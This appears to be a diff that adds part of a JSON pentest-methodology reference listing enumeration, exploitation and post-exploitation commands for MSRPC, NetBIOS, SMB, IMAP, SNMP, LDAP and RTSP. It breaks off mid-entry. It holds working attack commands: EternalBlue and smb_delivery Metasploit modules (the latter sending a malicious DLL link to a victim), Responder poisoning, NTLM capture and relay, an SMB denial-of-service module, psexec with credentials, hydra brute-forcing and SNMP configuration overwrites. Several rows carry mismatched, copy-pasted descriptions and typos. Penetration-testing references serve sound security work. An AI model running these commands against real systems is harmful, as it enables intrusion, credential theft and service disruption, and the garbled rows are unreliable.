+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "rpcclient -- enumerate Windows domain",
+     "command": "# Server info\nrpcclient $> srvinfo\n\n# Enumerate domains\nrpcclient $> enumdomains\n# Enumerate domain users\nrpcclient $> enumdomusers\n# Enumerate domain groups\nrpcclient $> enumdomgroups\n\n# Domain info\nrpcclient $> querydominfo\n\n# Current username\nrpcclient $> getusername",
+     "command_desc": "These rpcclient commands are used to gather information about a Windows server, including server details, domains, domain users, domain groups, domain info, and the current username.",
+     "description": "",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "Exploitation",
+     "method": "default creds",
+     "command": "rpcclient -U \"\" -N <TARGET_IP>",
+     "command_desc": "trying to access with default credentials or no credentials",
+     "description": "",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "MSRPC DCOM",
+     "command": "nmap -p 135 --script=msrpc-dcom-interface-activation <TARGET_IP>",
+     "command_desc": "MSRPC DCOM is one of the most dangerous services on Windows systems due to the amount of control it can give an attacker. It should be disabled if not needed. MSRPC endpoints can be abused to execute arbitary code on a remote computer.",
+     "description": "",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "Referance",
+     "command": "https://juggernaut-sec.com/ad-recon-msrpc/",
+     "command_desc": "",
+     "description": "",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "Note",
+     "command": "MSRPC has several interfaces that could be potentially exploited for gaining unauthorized access, remote command execution, enumerating users and domains, accessing public SAM database elements, remotely starting and stopping services, accessing and modifying the system registry, and more. These interfaces include:\n\nLSA interface (pipe\\lsarpc)\nLSA Directory Services (DS) interface (pipe\\lsarpc)\nLSA SAMR interface (pipe\\samr)\nServer services and Service control manager interface (pipe\\svcctl), (pipe\\srvsvc)\nRemote registry service (pipe\\winreg)\nTask scheduler (pipe\\atsvc)\nDCOM interface (pipe\\epmapper)",
+     "command_desc": "",
+     "description": "",
+     "remarks": "",
+     "reference": ""
+    }
+   ]
+  },
+  {
+   "key": "netbios-137-139",
+   "name": "NetBIOS",
+   "ports": [
+    137,
+    138,
+    139
+   ],
+   "aliases": [
+    "netbios-ssn",
+    "netbios-ns"
+   ],
+   "intro": "NetBIOS (Network Basic Input/Output System) is a networking protocol that provides services related to the session layer (Layer 5) of the OSI model, allowing applications on different computers to communicate over a local area network (LAN)",
+   "rows": [
+    {
+     "phase": "Enumeration",
+     "method": "Nbtscan",
+     "command": "nbtscan <target_ip_range>",
+     "command_desc": "This will reveal the NetBIOS names, along with information like the MAC address, domain, and logged-in user names",
+     "description": "",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "Nmap Script",
+     "command": "nmap -sU --script nbstat -p137 <target_ip>",
+     "command_desc": "This will reveal the NetBIOS names, along with information like the MAC address, domain, and logged-in user names",
+     "description": "",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "Rpcclient",
+     "command": "rpcclient -U \"\" <target_ip>\n> srvinfo\n> enumdomusers\n> netshareenum",
+     "command_desc": "This will return shared directories and user accounts.",
+     "description": "",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "Exploitation",
+     "method": "Rpcclient",
+     "command": "rpcclient -U \"\" <target_ip>\n> srvinfo\n> enumdomusers\n> lsaenumsid",
+     "command_desc": "Null Session Attack",
+     "description": "",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "Metasploit",
+     "command": "use auxiliary/scanner/smb/smb_enumshares\nset RHOSTS <target_ip>\nrun",
+     "command_desc": "This will list available shares and allow anonymous access.",
+     "description": "",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "NBT-NS Poisoning",
+     "command": "sudo responder -I <interface>",
+     "command_desc": "This will start listening for NBT-NS and LLMNR requests on the specified network interface, poisoning the responses.",
+     "description": "",
+     "remarks": "Interface- wathever the internal intrface ex eth0,",
+     "reference": ""
+    }
+   ]
+  },
+  {
+   "key": "smb-139-445",
+   "name": "SMB",
+   "ports": [
+    139,
+    445
+   ],
+   "aliases": [
+    "microsoft-ds",
+    "netbios-ssn"
+   ],
+   "intro": "Server Message Block (SMB) is a network protocol used for sharing files, printers, and communication between devices on a network. In pentesting, SMB is often targeted to exploit vulnerabilities such as weak authentication, improper permissions, and misconfigurations to gain unauthorized access to sensitive data or escalate privileges within a network",
+   "rows": [
+    {
+     "phase": "Enumeration",
+     "method": "Banner Grabbing",
+     "command": "smbclient -L //<target_IP>",
+     "command_desc": "lists all the shared resources (like folders and printers) available on the target SMB/CIFS server identified by <target_IP>",
+     "description": "Banner Grabbing is essentially getting more information about the technology and software versions behind the application you are attempting to exploit.",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "RID cycling",
+     "command": "enum4linux -a <target_IP>",
+     "command_desc": "performs a comprehensive enumeration of a target IP, gathering detailed information about the target’s SMB shares, users, groups, OS details, and more.",
+     "description": "RID Cycling is a method that allows attackers to enumerate domain objects by bruteforcing or guessing RIDs and SIDs, based on the fact that RIDs are sequential.",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "User listing",
+     "command": "rpcclient -U \"\" -N <target_IP> -c \"enumdomusers\"",
+     "command_desc": "to enumerate domain users on a target machine without providing a username or password.",
+     "description": "To list users, you can use the pdbedit command",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "Listing of group membership information",
+     "command": "enum4linux -G <target_ip>",
+     "command_desc": "enumerates groups in the network",
+     "description": "Groups within samba are mapped over from the normal Unix groups used on your system. You can view these with the command.\nsudo cat /etc/group",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "Mount share",
+     "command": "mount -t cifs //x.x.x.x/share /mnt/share\nmount -t cifs -o \"username=user,password=password\" //x.x.x.x/share /mnt/share",
+     "command_desc": "The mount -t cifs command is used to mount a CIFS (SMB) network share to a local directory,",
+     "description": "All files in Linux are accessible on a single giant hierarchical directory tree, which starts at the root (/). The mount command enables you to access other storage devices or file systems from that same tree. These other storage resources do not have to be physical disks and they do not have to be using the same file system.\nmount -t cifs //x.x.x.x/share /mnt/share, mount -t cifs -o \"username=user,password=password\" //x.x.x.x/share /mnt/share",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "Exploitation",
+     "method": "Eternal blue",
+     "command": "use exploit/windows/smb/ms17_010_eternalblue\nmsf exploit(ms17_010_eternalblue) > set rhost 192.168.1.101\nmsf exploit(ms17_010_eternalblue) > exploit",
+     "command_desc": "metasploit module to exploit eternal bule attak",
+     "description": "if we know it is vulnerable to MS17-010 and we can use Metasploit to exploit this machine. Therefore we run the following module which will directly exploit the target machine.",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "SMB login via Brute Force",
+     "command": "hydra -L user.txt -P pass.txt 192.168.1.101 smb\n-L –> denotes the path of username list\n\n-P –>denote the path of password",
+     "command_desc": "Brute forcing and guessing username and password for getting smb connection using hydra tool",
+     "description": "Here we only need two dictionaries that contain a list of username and password in each and a brute force tool to make brute force attack.",
+     "remarks": "Perform brute force based enumeration or attacks with concern of project lead and client knowledge.",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "Rundll32 One-liner to Exploit SMB",
+     "command": "use exploit/windows/smb/smb_delivery\nmsf exploit(windows/smb/smb_delivery) > set srvhost 192.168.1.109\nmsf exploit(windows/smb/smb_delivery) > exploit",
+     "command_desc": "Uing Metasploit sets up to launches the windows/smb/smb_delivery exploit, configuring the local machine's IP as the server host (srvhost) and then initiating the exploit to deliver a payload over SMB to a target.",
+     "description": "This module serves payloads via an SMB server and provides commands to retrieve and execute the generated payloads. Currently supports DLLs and Powershell.\n\nThis will generate a link for malicious DLL file, now send this link to your target and wait for his action.As soon as the victim will run above malicious code inside the run prompt or command prompt, we will get a meterpreter session at Metasploit.",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "SMB Exploit via NTLM Capture",
+     "command": "use auxiliary/server/capture/smb\nmsf auxiliary(smb) > set srvhost 192.168.1.109\nmsf auxiliary(smb) > set johnpwfile /root/Desktop/\nmsf auxiliary(smb) > exploit",
+     "command_desc": "This command configures and runs a Metasploit auxiliary module to capture SMB authentication hashes by setting the server host to 192.168.1.109 and specifying a path to save captured credentials, then starts the exploit.",
+     "description": "An NTLM capture attack in SMB pentesting involves intercepting and capturing NTLM authentication hashes when a user attempts to authenticate to a malicious SMB server. These captured hashes can then be used in offline brute-force attacks to crack passwords or perform relay attacks to gain unauthorized access to network resources.",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "SMB DOS-Attack",
+     "command": "use auxiliary/dos/windows/smb/ms10_006_negotiate_response_loop\nmsf auxiliary(ms10_006_negotiate_response_loop) > set srvhost 192.168.1.106\nmsf auxiliary(ms10_006_negotiate_response_loop) > exploit",
+     "command_desc": "These commands configure and run the Metasploit module ms10_006_negotiate_response_loop to exploit a Denial of Service (DoS) vulnerability in Windows SMB by setting the server host to 192.168.1.106 and then executing the exploi",
+     "description": "SMB Dos attack is another most excellent method we have in our Metasploit framework.\n\nThis module exploits a denial of service flaw in the Microsoft Windows SMB client on Windows 7 and Windows Server 2008 R2. To trigger this bug, run this module as a service and forces a vulnerable client to access the IP of this system as an SMB server. This can be accomplished by embedding a UNC path (\\HOST\\share\\something) into a web page if the target is using Internet Explorer or a Word document otherwise.\n\n\nNow, when the victim will try to access the shared folder through our malicious IP, the target machine will get crushed and this attack is very effective.",
+     "remarks": "Perform brute force based enumeration or attacks with concern of project lead and client knowledge.",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "Share enumeration (Anonymous login)",
+     "command": "smbclient -L //<target_IP> -N",
+     "command_desc": "tring to login without credentials",
+     "description": "SMB works on sharing files and resources. In order to transfer these files or resources, there are data streams that are called shares. There are public shares that are accessible to everyone on the network and then there are the user-specific shares. It is always recommended to look if you can access to anything, if you don't have credentials try using null credentials/guest user. Ex: SMBMAP, smbclient",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "SMB relay",
+     "command": ".\\ntlmrelayx.exe --smb-port 8445 -t [IP] or [CIDR] -smb2support\n\n# Execute Command\n.\\ntlmrelayx.exe --smb-port 8445 -t [IP] or [CIDR] -smb2support -c \"\"ipconfig\"\"\"",
+     "command_desc": "These commands run ntlmrelayx.exe to relay NTLM authentication requests to the target IP or CIDR on port 8445 with SMB2 support, and the second command additionally executes the ipconfig command on the target.",
+     "description": "\"A SMB relay attack is where an attacker captures a users NTLM hash and relays its to another machine on the network. Masquerading as the user and authenticating against SMB to gain shell or file access\n # Dump SAM",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "Post exploitation",
+     "method": "PSexec – To Connect SMB",
+     "command": "use exploit/windows/smb/psexec\nmsf exploit windows/smb/psexec) > set rhost 192.168.1.101\nmsf exploit(windows/smb/psexec) > set smbuser raj\nmsf exploit(windows/smb/psexec) > set smbpass 123\nmsf exploit(windows/smb/psexec) > exploit",
+     "command_desc": "The commands configure and execute the Metasploit psexec exploit to gain remote code execution on a target Windows machine at 192.168.1.101 using the SMB credentials raj and 123",
+     "description": "Once you have SMB login credential of target machine then with the help of the following module of Metasploit you can obtain meterpreter session to access the remote shell.\n\n\nOnce the commands run you will gain a meterpreter session of your victim’s PC and so you can access it as you want.",
+     "remarks": "",
+     "reference": ""
+    }
+   ]
+  },
+  {
+   "key": "imaps-993-143",
+   "name": "IMAP / IMAPS",
+   "ports": [
+    143,
+    993
+   ],
+   "aliases": [
+    "imap",
+    "imaps"
+   ],
+   "intro": "IMAPS (Internet Message Access Protocol Secure) uses port 993 to provide a secure method for accessing email from a remote server over an encrypted SSL/TLS connection. This port can be targeted to test the security of email communications, checking for vulnerabilities like weak encryption protocols, improper authentication mechanisms, or potential misconfigurations that could allow unauthorized access to sensitive email data",
+   "rows": [
+    {
+     "phase": "Enumeration",
+     "method": "Banner Grabbing",
+     "command": "nc -nv <IP> 143\nopenssl s_client -connect <IP>:993 -quiet",
+     "command_desc": "Banner grabbing is used to identify consul server versions. You can use the following tools to find banner grabbing",
+     "description": "",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "NTLM Auth - Information disclosure",
+     "command": "telnet example.com 143",
+     "command_desc": "Banner grabbing is used to identify consul server versions. You can use the following tools to find banner grabbing",
+     "description": "",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "Enumerate IMAP capabilities",
+     "command": "nmap --script imap-capabilities -p 143, 93 <target-ip>",
+     "command_desc": "The command nmap --script imap-capabilities -p 143 <target-ip> runs an Nmap script to enumerate the IMAP capabilities of a mail server running on port 143 (standard IMAP), 993, revealing supported features and potentially identifying security vulnerabilities.",
+     "description": "",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "nmap enumeration",
+     "command": "nmap -p 143, 993 <IP>  -sV  -sC -A",
+     "command_desc": "This command scans the specified IP address for consul vulnerabilities and information using all Nmap imap related scripts on port 143 and 993.",
+     "description": "",
+     "remarks": "Performing an Nmap script scan can generate a lot of traffic, so please make sure to inform the project lead and the client before running the scan. It is better to select specific scripts and run them individually. You can find these scripts with the following command: ls -al /usr/share/nmap/scripts/ | grep -e imap",
+     "reference": ""
+    },
+    {
+     "phase": "Exploitation",
+     "method": "Brute Force",
+     "command": "hydra -l USERNAME -P /path/to/passwords.txt -f <IP> imap -V\nhydra -S -v -l USERNAME -P /path/to/passwords.txt -s 993 -f <IP> imap -V\nnmap -sV --script imap-brute -p <PORT> <IP>\nlegba imap --username user --password data/passwords.txt --target localhost:993",
+     "command_desc": "trying to guess the username and passwords to authenticate using hydra tool and other tools",
+     "description": "",
+     "remarks": "Perform brute force based enumeration or attacks with concern of project lead and client knowledge.",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "Evolution",
+     "command": "sudo apt install evolution",
+     "command_desc": "The Evolution tool is not specifically designed for exploiting the IMAP port. Instead, Evolution is a popular open-source email client for the GNOME desktop environment on Linux systems. It integrates email, calendar, contacts, tasks, and memos, similar to Microsoft Outlook.",
+     "description": "",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "Post Exploitatin",
+     "method": "Listing mailboxes",
+     "command": "curl -k 'imaps://1.2.3.4/' --user user:pass",
+     "command_desc": "This command uses curl to connect to an IMAP server over SSL/TLS (IMAPS) at IP address 1.2.3.4, bypassing SSL certificate verification (-k), and attempts to authenticate using the specified user and pass credentials.",
+     "description": "",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "Listing messages in a mailbox",
+     "command": "curl -k 'imaps://1.2.3.4/INBOX?ALL' --user user:pass\ncurl -k 'imaps://1.2.3.4/Drafts?TEXT password' --user user:pass",
+     "command_desc": "This command uses curl to connect to an IMAP server over SSL/TLS (IMAPS) at IP address 1.2.3.4, bypassing SSL certificate verification (-k), and attempts to authenticate using the specified user and pass credentials. and list messages in mailbox",
+     "description": "",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "Downloading a message",
+     "command": "curl -k 'imaps://1.2.3.4/Drafts;MAILINDEX=1' --user user:pass\ncurl -k 'imaps://1.2.3.4/INBOX' -X 'UID SEARCH ALL' --user user:pass\ncurl -k 'imaps://1.2.3.4/INBOX;UID=1' --user user:pass\ncurl -k 'imaps://1.2.3.4/INBOX' -X 'FETCH 1:5 BODY[HEADER.FIELDS (SUBJECT FROM)]' --user user:pass -v 2>&1 | grep '^<'",
+     "command_desc": "This command uses curl to connect to an IMAP server over SSL/TLS (IMAPS) at IP address 1.2.3.4, bypassing SSL certificate verification (-k), and attempts to authenticate using the specified user and pass credentials. and list downloads messages from mailbox",
+     "description": "",
+     "remarks": "",
+     "reference": ""
+    }
+   ]
+  },
+  {
+   "key": "snmp-161-162",
+   "name": "SNMP",
+   "ports": [
+    161,
+    162
+   ],
+   "aliases": [
+    "snmp"
+   ],
+   "intro": "SNMP (Simple Network Management Protocol) is used for monitoring and managing network devices like routers, switches, and servers by sending queries and receiving responses over UDP port 161. Penetration testers exploit SNMP to gather valuable information about network devices, configurations, and topology. If SNMP is misconfigured or uses default community strings, attackers can gain unauthorized access, allowing them to enumerate sensitive data and potentially alter device settings.",
+   "rows": [
+    {
+     "phase": "Enumeration",
+     "method": "Banner Grabbing",
+     "command": "telnet <ip> 161",
+     "command_desc": "Banner grabbing is used to identify consul server versions. You can use the following tools to find banner grabbing",
+     "description": "",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "Auxiliary Enumeration",
+     "command": "use auxiliary/scanner/snmp/snmp_enum\nset RHOSTS 192.222.206.3\nrun",
+     "command_desc": "Enumeration using metasploit module",
+     "description": "",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "nmap enumeration",
+     "command": "nmap -sU --script snmp-info -p 161 <target-ip>\nnmap -sU --script snmp-interfaces -p 161 <target-ip>\nnmap -sU --script snmp-processes -p 161 <target-ip>\nnmap -sU --script snmp-sysdescr -p 161 <target-ip>\nnmap -sU --script snmp* -p 161 <target-ip>",
+     "command_desc": "Enumeration with nmap scripts",
+     "description": "",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "Exploitation",
+     "method": "Brute Force the Community Names",
+     "command": "hydra -P /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt <target-ip> snmp\n\nonesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt <target-ip>",
+     "command_desc": "Trying to guess username and password using hydra tool",
+     "description": "",
+     "remarks": "Perform brute force based enumeration or attacks with concern of project lead and client knowledge.",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "SNMP Login Auxiliary Module",
+     "command": "use auxiliary/scanner/snmp/snmp_login\nset RHOSTS 192.222.206.3\nrun",
+     "command_desc": "It runs the auxiliary/scanner/snmp/snmp_login module to attempt SNMP community string authentication against the target IP address 192.222.206.3. This helps identify valid community strings that could be used for further network reconnaissance and exploitation.",
+     "description": "",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "SNMP Set Auxiliary Module",
+     "command": "use auxiliary/scanner/snmp/snmp_set\nset OID 1.3.6.1.2.1.1.5.0\nset OIDVALUE NotHacked!!\nset RHOSTS 192.222.206.3\nexploit",
+     "command_desc": "It changes the SNMP system name (OID 1.3.6.1.2.1.1.5.0) to \"NotHacked!!\" on the device with the IP address 192.222.206.3, demonstrating the ability to modify device configuration using SNMP if access is misconfigured or insecure.",
+     "description": "",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "Run snmpwalk on the target",
+     "command": "snmpwalk -v 1 192.222.206.3 -c public",
+     "command_desc": "The command snmpwalk -v 1 192.222.206.3 -c public performs an SNMP (Simple Network Management Protocol) query using version 1 of the protocol to the device at IP address 192.222.206.3. It uses the community string public (often the default read-only community string) to recursively retrieve and display all SNMP data available from the target device, providing details about its configuration, interfaces, and other system information.",
+     "description": "",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "Get the sysName value",
+     "command": "nmpwalk -c public 192.222.206.3 -v1 -On | grep ‘.1.3.6.1.2.1.1.5.0’",
+     "command_desc": "The command snmpwalk -c public 192.222.206.3 -v1 -On | grep '.1.3.6.1.2.1.1.5.0' is used to query an SNMP-enabled device (with IP address 192.222.206.3) using the SNMP community string public and SNMP version 1. The command retrieves and filters information to find the system name, which is represented by the OID .1.3.6.1.2.1.1.5.0",
+     "description": "",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "Rewrite the sysName using snmpset",
+     "command": "snmpset -v 1 -c public 192.222.206.3 ‘.1.3.6.1.2.1.1.5.0’ s",
+     "command_desc": "The command snmpset -v 1 -c public 192.222.206.3 ‘.1.3.6.1.2.1.1.5.0’ s sets the value of the SNMP OID (Object Identifier) .1.3.6.1.2.1.1.5.0, which typically represents the system's hostname, to a new value (though the new value isn't specified in the command). It uses SNMP version 1 (-v 1) with the community string \"public\" (-c public) to make changes on the device with IP address 192.222.206.3.",
+     "description": "",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "Verify the value using snmpwalk",
+     "command": "snmpwalk -c public 192.222.206.3 -v1 -On | grep ‘.1.3.6.1.2.1.1.5.0’",
+     "command_desc": "The command snmpwalk -c public 192.222.206.3 -v1 -On | grep ‘.1.3.6.1.2.1.1.5.0’ performs an SNMP walk using the community string \"public\" on the device with IP 192.222.206.3, using SNMP version 1, and displays OID values in numeric form. The grep command filters the results to find the specific OID .1.3.6.1.2.1.1.5.0, which corresponds to the device's hostname, effectively querying and displaying the hostname of the target device.",
+     "description": "",
+     "remarks": "",
+     "reference": ""
+    }
+   ]
+  },
+  {
+   "key": "ldap",
+   "name": "LDAP",
+   "ports": [
+    389,
+    636
+   ],
+   "aliases": [
+    "ldap",
+    "ldapssl"
+   ],
+   "intro": "",
+   "rows": [
+    {
+     "phase": "What is LDAP ?",
+     "method": "LDAP is a protocol used for accessing and managing directory services, providing a standardized way to handle hierarchical data. It is widely used for various purposes, including user authentication, contact management, and representing organizational structures. Understanding LDAP’s structure, operations, and security features is essential for effective management and utilization of directory services",
+     "command": "",
+     "command_desc": "",
+     "description": "",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "Enumeration",
+     "method": "Nmap",
+     "command": "nmap -p 389 --script ldap-search --script-args\n'ldap.username=\"cn=ldaptest,cn=users,dc=cqure,\ndc=net\",ldap.password=ldaptest,\nldap.qfilter=users,ldap.attrib=sAMAccountName' <IP address",
+     "command_desc": "By using Nmap’s LDAP-search NSE script we can scan for the LDAP service, and then we can try other arguments for this script like LDAP.searchattrib, also you can use the LDAP-brute script, and when you don’t have any valid credentials.",
+     "description": "",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "Ldapsearch",
+     "command": "$ ldapsearch -x -H ldap://<IP address>\n -D '' -w '' -b \"DC=<1_SUBDOMAIN>,DC=<TLD>\"\n#to validate the credentials\n$ ldapsearch -x -H ldap://<IP address>\n-D '<DOMAIN>\\<username>' -w '<password>'\n-b \"DC=<1_SUBDOMAIN>,DC=<TLD>\"",
+     "command_desc": "LDAP search makes a connection to an LDAP server, and it executes a search by using different paraments. The filter conforms to the string representation for search filters as defined in RFC 4515 else it uses (objectClass=*). #To check null credentials",
+     "description": "",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "Dictonary attack to find valid users",
+     "command": "#!/usr/bin/env perl\nuse strict;\nuse warnings;\nuse Net::LDAP;\nmy $server   = \"ldap.acme.com\";\nmy $base     = \"dc=acme,dc=com\";\nmy $filename = \"users.txt\";\nopen(my $fh, '<', $filename) or die $!;\nmy $ldap = Net::LDAP->new($server) or die $@;\nwhile (my $word = <$fh>) {\n    chomp($word);\n    my $search = $ldap->search(\n        base    => $base,\n        scope   => 'sub',\n        filter  => '(&(uid='.$word.'))',\n        attrs   => ['dn']\n    );\n    print \"[+] Found valid login name $word\\n\" if(defined($search->entry));\n}",
+     "command_desc": "We can use Perl and the Net::LDAP module to check for valid users on the remote LDAP server. The simple script below searches for valid users and returns a distinguished name if found.",
+     "description": "",
+     "remarks": "Perform brute force based enumeration or attacks with concern of project lead and client knowledge.",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "enum4linux",
+     "command": "$ enum4linux <IP address> |\negrep \"Account|Domain|Lockout|group\"",
+     "command_desc": "Enum4linux is a great tool that is used in windows enumeration, hence we are going to look at this tool’s usage. Using the below command, you can enumerate the accounts and groups.",
+     "description": "",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "Exploitation",
+     "method": "Authenticated Bind Enumeration",
+     "command": "ldapwhoami -h ldap.acme.com -w \"abcd123\"\nSASL/DIGEST-MD5 authentication started\nldap_sasl_interactive_bind_s: Invalid credentials (49)\n additional info: SASL(-13): user not found: no secret in database\nsam@asus:~%",
+     "command_desc": "For a authenticated LDAP bind we need to crack some passwords, preferably the ldap administrators. We also need identify the authentication used such as md5 ,etc.\nWe can get the authentication method by using a bogus password and trying to login",
+     "description": "",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "Authentication via kerberos",
+     "command": "ldapsearch -H ldap://your-ldap-server -b \"base-dn\" -D \"bind-user-dn\" -W -Y GSSAPI",
+     "command_desc": "Using ldapsearch you can authenticate against kerberos instead of via NTLM by using the parameter",
+     "description": "",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "Post Exploitation",
+     "method": "Windapsearch",
+     "command": "python3 windapsearch.py --dc-ip\n<IP address> -u <username>\n-p <password> --computers\n\n#for groups\npython3 windapsearch.py --dc-ip <IP address>\n-u <username> -p <password> --groups\n\n#for users\npython3 windapsearch.py --dc-ip <IP address>\n-u <username> -p <password> --da\n\n#for privileged users\npython3 windapsearch.py --dc-ip <IP address>\n-u <username> -p <password> --privileged-users",
+     "command_desc": "Windapsearch is a python script that is used to enumerate users, groups, and computers from a windows domain by taking the leverage of LDAP queries.#for computers",
+     "description": "",
+     "remarks": "",
+     "reference": ""
+    }
+   ]
+  },
+  {
+   "key": "rtsp-554-8554",
+   "name": "RTSP",
+   "ports": [
+    554,
+    8554
+   ],
+   "aliases": [
+    "rtsp"
+   ],
+   "intro": "",
+   "rows": [
+    {
+     "phase": "What is RTSP ?",
+     "method": "The Real Time Streaming Protocol (RTSP) is a network control protocol designed for use in entertainment and communications systems to control streaming media servers. The protocol is used for establishing and controlling media sessions between end points. Clients of media servers issue VHS-style commands, such as play, record and pause, to facilitate real-time control of the media streaming from the server to a client (Video On Demand) or from a client to the server (Voice Recording).",
+     "command": "",
+     "command_desc": "",
+     "description": "",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "Enumeration",
+     "method": "Nmap or Telnet",
+     "command": "nmap -sV --script \"rtsp-*\" -p <PORT> <IP>\ntelnet <target-ip> 554",
+     "command_desc": "Get information about valid methods and URLs are supported and try to brute-force the access (if needed) to get access to the content.",
+     "description": "",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "Check Response Codes",
+     "command": "Expected Outcome: Correct status codes like 200 OK, 404 Not Found, 401 Unauthorized should be returned.",
+     "command_desc": "",
+     "description": "",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "Vlc",
+     "command": "vlc rtsp://<target-ip>:554/<media-path>",
+     "command_desc": "Tests if the RTSP stream requires authentication by attempting to access it via VLC media player.",
+     "description": "",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "rtsp-client",
+     "command": "rtsp-client -u <username> -p <password> rtsp://<target-ip>:554/<stream>",
+     "command_desc": "This command connects to an RTSP stream using the specified credentials.",
+     "description": "",
+     "remarks": "This command connects to an RTSP stream using the specified credentials.\nThese commands test different RTSP methods to interact with the server..",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "Burpsuite",
+     "command": "Analyze and modify RTSP requests and responses using Burp Suite’s tools.",
+     "command_desc": "Enum4linux is a great tool that is used in windows enumeration, hence we are going to look at this tool’s usage. Using the below command, you can enumerate the accounts and groups.",
+     "description": "",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "Exploitation",
+     "method": "Directory Traversal",
+     "command": "rtsp-client rtsp://<target-ip>:554/../path/to/resource",
+     "command_desc": "Directory traversal should be prevented.",
+     "description": "",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "Metasploit",
+     "command": "search rtsp\nuse exploit/linux/http/rtsp_unauthenticated\nset RHOSTS <target-ip>\nset RPORT 554\nrun",
+     "command_desc": "Replace exploit/linux/http/rtsp_unauthenticated with the appropriate module if available and applicable to your target.",
+     "description": "",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "URL Manipulation",
+     "command": "rtsp-client rtsp://<target-ip>:554/../unauthorized_file",
+     "command_desc": "Access to unauthorized resources should be denied.",
+     "description": "",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "Session Management",
+     "command": "rtsp-client -u <username> -p <password> rtsp://<target-ip>:554/<stream>?session=<session-id>",
+     "command_desc": "Use intercepted or fixed session IDs in requests.",
+     "description": "",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "Session Expiry:",
+     "command": "Command: Monitor session behavior after inactivity.\nExpected Outcome: Sessions should expire as expected, requiring re-authentication.",
+     "command_desc": "",
+     "description": "",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "Error Messages",
+     "command": "rtsp-client rtsp://<target-ip>:554/invalid_request",
+     "command_desc": "Error messages should be generic and not disclose implementation details.",
+     "description": "",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "Input Validation",
+     "command": "rtsp-client rtsp://<target-ip>:554/stream?param=<malformed-input>",
+     "command_desc": "Inputs should be properly validated and sanitized.",
+     "description": "",
+     "remarks": "",
+     "reference": ""
+    }
+   ]
+  },
+  {
+   "key": "rusersd",
+   "name": "rusersd",
+   "ports": [
+    1026
+   ],
+   "aliases": [],
+   "intro": "The rusersd service, typically running on port 1026, is a part of the RPC (Remote Procedure Call) services, often found in Unix/Linux systems. It's used to report information about users logged into a system.",
+   "rows": [
+    {
+     "phase": "Enumeration",
+     "method": "nmap",
